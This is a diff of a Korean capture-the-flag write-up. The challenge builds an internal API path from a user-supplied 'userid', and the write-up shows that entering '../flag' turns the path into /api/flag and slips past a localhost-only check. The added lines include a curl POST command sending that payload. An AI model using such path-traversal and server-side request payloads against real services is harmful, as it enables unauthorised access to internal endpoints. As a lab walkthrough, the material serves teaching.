@@ -1,21 +1,26 @@
 # 내부 API 경로 조작
 
-입력한 `userid`가 내부 요청 경로에 그대로 들어간다.
+`userid`를 조작해서 내부의 플래그 주소에 접근한다.
 
 ## 코드 확인
 
 ```python
 API_HOST = 'http://127.0.0.1:8000'
 
-userid = request.form.get('userid', '')
-info = requests.get(f'{API_HOST}/api/user/{userid}').text
+@app.route('/get_info', methods=['GET', 'POST'])
+def get_info():
+    # ...
+    userid = request.form.get('userid', '')
+    info = requests.get(f'{API_HOST}/api/user/{userid}').text
 ```
 
-`/get_info`에서 입력한 값으로 서버가 직접 요청을 보낸다.
+`/get_info`는 POST로 받은 `userid`를 경로에 넣어 서버 내부로 요청한다.
 
 ```python
 if request.remote_addr == '127.0.0.1':
     return func(*args, **kwargs)
+else:
+    abort(401)
 
 @app.route('/api/flag')
 @internal_api
@@ -23,22 +28,26 @@ def flag():
     return FLAG
 ```
 
-`/api/flag`는 내부에서만 접근할 수 있다. 서버의 요청을 이용해 보자.
+`@internal_api`는 요청이 서버 내부에서 왔는지 확인한다. `/api/flag`에 직접 접속하면 거절된다.
 
 ## 풀이
 
-**1.** `/get_info`의 userid 입력칸에 넣는다.
-
-```text
-../flag
-```
-
-**2.** 요청 경로가 정리되면서 `/api/flag`로 바뀐다.
+**1.** `userid`에 `../flag`를 넣으면 요청 경로가 이렇게 바뀐다.
 
 ```text
 /api/user/../flag → /api/flag
 ```
 
-서버가 내부 주소로 요청하므로 접근 제한을 통과하고, 응답에 플래그가 표시된다.
+`..`은 한 단계 위로 이동한다. 서버가 자기 자신에게 요청하므로 내부 접근 조건도 통과한다.
 
-> 입력값을 경로에 그대로 넣어서 생긴 문제다.
+**2.** curl로 `/get_info`에 보낸다. 서버 주소와 포트는 문제에 나온 값으로 바꾼다.
+
+```bash
+curl -X POST 'http://서버주소:포트/get_info' --data-urlencode 'userid=../flag'
+```
+
+`userid=../flag`는 코드에서 받는 `userid`에 `../flag`를 넣는다는 뜻이다. `--data-urlencode`는 이 값을 폼 데이터로 전송한다.
+
+**3.** 응답에서 플래그를 확인한다.
+
+> 입력값을 내부 요청 경로에 그대로 넣어서 생긴 문제다.
